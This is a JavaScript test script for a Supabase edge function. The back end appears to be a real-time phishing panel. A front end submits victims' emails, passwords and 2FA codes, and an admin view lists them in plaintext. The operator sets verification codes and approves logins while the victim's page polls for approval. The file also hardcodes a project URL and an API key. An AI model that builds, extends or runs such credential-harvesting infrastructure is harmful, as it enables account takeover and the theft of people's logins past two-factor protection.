// TEST ADMIN-API FUNCTION
// All endpoints updated to admin-api

const SUPABASE_URL = 'https://nqsdardermkzppeaazbb.supabase.co';
const ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5xc2RhcmRlcm1renBwZWFhemJiIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTA5NTY1NjUsImV4cCI6MjA2NjUzMjU2NX0.1sxR4WFiuwZbfGBSr-lZCMMbRfAGwwFpZOx_bzqsvbc';

const headers = {
    'Content-Type': 'application/json',
    'Authorization': `Bearer ${ANON_KEY}`,
    'apikey': ANON_KEY
};

console.log('🚀 TESTING ADMIN-API FUNCTION...\n');

// Test 1: Root endpoint
async function testRoot() {
    console.log('1️⃣ Testing ROOT endpoint...');
    try {
        const response = await fetch(`${SUPABASE_URL}/functions/v1/admin-api/`, {
            method: 'GET',
            headers: headers
        });
        
        const data = await response.json();
        console.log('✅ ROOT Status:', response.status);
        console.log('📋 Response:', data.message);
        console.log('📊 Available Endpoints:', data.endpoints?.length || 0);
        return true;
    } catch (error) {
        console.log('❌ ROOT Error:', error.message);
        return false;
    }
}

// Test 2: Submit request (Frontend endpoint)
async function testSubmitRequest() {
    console.log('\n2️⃣ Testing SUBMIT REQUEST endpoint...');
    try {
        const response = await fetch(`${SUPABASE_URL}/functions/v1/admin-api/api/request`, {
            method: 'POST',
            headers: headers,
            body: JSON.stringify({
                email: 'test@example.com',
                password: 'testpassword123',
                twofa: '',
                userAgent: 'Test Browser',
                currentPage: 'index.html'
            })
        });
        
        const data = await response.json();
        console.log('✅ SUBMIT Status:', response.status);
        console.log('📝 Request ID:', data.requestId);
        return data.requestId;
    } catch (error) {
        console.log('❌ SUBMIT Error:', error.message);
        return null;
    }
}

// Test 3: Check pending requests (Admin GUI endpoint)
async function testPendingRequests() {
    console.log('\n3️⃣ Testing PENDING REQUESTS endpoint...');
    try {
        const response = await fetch(`${SUPABASE_URL}/functions/v1/admin-api/api/pending`, {
            method: 'GET', 
            headers: headers
        });
        
        const data = await response.json();
        console.log('✅ PENDING Status:', response.status);
        console.log('📊 Total Requests:', data.length);
        if (data.length > 0) {
            console.log('📧 Latest Email:', data[0].email);
            console.log('🔐 Latest Password:', data[0].password);
            console.log('📱 Latest Status:', data[0].status);
        }
        return data;
    } catch (error) {
        console.log('❌ PENDING Error:', error.message);
        return [];
    }
}

// Test 4: Check approval status (Frontend endpoint)
async function testCheckApproval() {
    console.log('\n4️⃣ Testing CHECK APPROVAL endpoint...');
    try {
        const response = await fetch(`${SUPABASE_URL}/functions/v1/admin-api/api/check-approval?email=test@example.com`, {
            method: 'GET',
            headers: headers
        });
        
        const data = await response.json();
        console.log('✅ CHECK APPROVAL Status:', response.status);
        console.log('📋 Approval Status:', data.status);
        console.log('🔢 Verification Code:', data.verificationCode || 'None');
        return data;
    } catch (error) {
        console.log('❌ CHECK APPROVAL Error:', error.message);
        return null;
    }
}

// Test 5: Set verification code (Admin GUI endpoint) 
async function testSetVerificationCode() {
    console.log('\n5️⃣ Testing SET VERIFICATION CODE endpoint...');
    try {
        const response = await fetch(`${SUPABASE_URL}/functions/v1/admin-api/api/set-verification-code`, {
            method: 'POST',
            headers: headers,
            body: JSON.stringify({
                email: 'test@example.com',
                code: '123456'
            })
        });
        
        const data = await response.json();
        console.log('✅ SET CODE Status:', response.status);
        console.log('📝 Success:', data.success);
        console.log('🔢 Code Set:', data.code);
        return data.success;
    } catch (error) {
        console.log('❌ SET CODE Error:', error.message);
        return false;
    }
}

// Test 6: Approve request (Admin GUI endpoint)
async function testApproveRequest(requestId) {
    if (!requestId) {
        console.log('\n6️⃣ SKIPPING APPROVE REQUEST (no request ID)');
        return false;
    }
    
    console.log('\n6️⃣ Testing APPROVE REQUEST endpoint...');
    try {
        const response = await fetch(`${SUPABASE_URL}/functions/v1/admin-api/api/approve`, {
            method: 'POST',
            headers: headers,
            body: JSON.stringify({
                id: requestId,
                decision: 'approved',
                verificationCode: '789123'
            })
        });
        
        const data = await response.json();
        console.log('✅ APPROVE Status:', response.status);
        console.log('📝 Success:', data.success);
        return data.success;
    } catch (error) {
        console.log('❌ APPROVE Error:', error.message);
        return false;
    }
}

// Run all tests
async function runAllTests() {
    console.log('🎯 ADMIN-API COMPREHENSIVE TEST\n');
    console.log('🔗 Base URL:', SUPABASE_URL);
    console.log('🔑 Function: admin-api');
    console.log('=' .repeat(50));
    
    const rootOk = await testRoot();
    const requestId = await testSubmitRequest();
    const pendingData = await testPendingRequests();
    const approvalData = await testCheckApproval();
    const codeSet = await testSetVerificationCode();
    const approved = await testApproveRequest(requestId);
    
    console.log('\n' + '='.repeat(50));
    console.log('📊 TEST SUMMARY:');
    console.log('✅ Root Endpoint:', rootOk ? 'PASS' : 'FAIL');
    console.log('✅ Submit Request:', requestId ? 'PASS' : 'FAIL');
    console.log('✅ Pending Requests:', pendingData.length >= 0 ? 'PASS' : 'FAIL');
    console.log('✅ Check Approval:', approvalData ? 'PASS' : 'FAIL');
    console.log('✅ Set Verification Code:', codeSet ? 'PASS' : 'FAIL');
    console.log('✅ Approve Request:', approved ? 'PASS' : 'FAIL');
    
    const passCount = [rootOk, !!requestId, pendingData.length >= 0, !!approvalData, codeSet, approved].filter(Boolean).length;
    console.log(`\n🏆 FINAL SCORE: ${passCount}/6 tests passed`);
    
    if (passCount === 6) {
        console.log('🎉 ALL TESTS PASSED! Admin-API is fully functional! 🚀');
    } else {
        console.log('⚠️ Some tests failed. Check the logs above for details.');
    }
}

// Execute tests
runAllTests().catch(console.error); 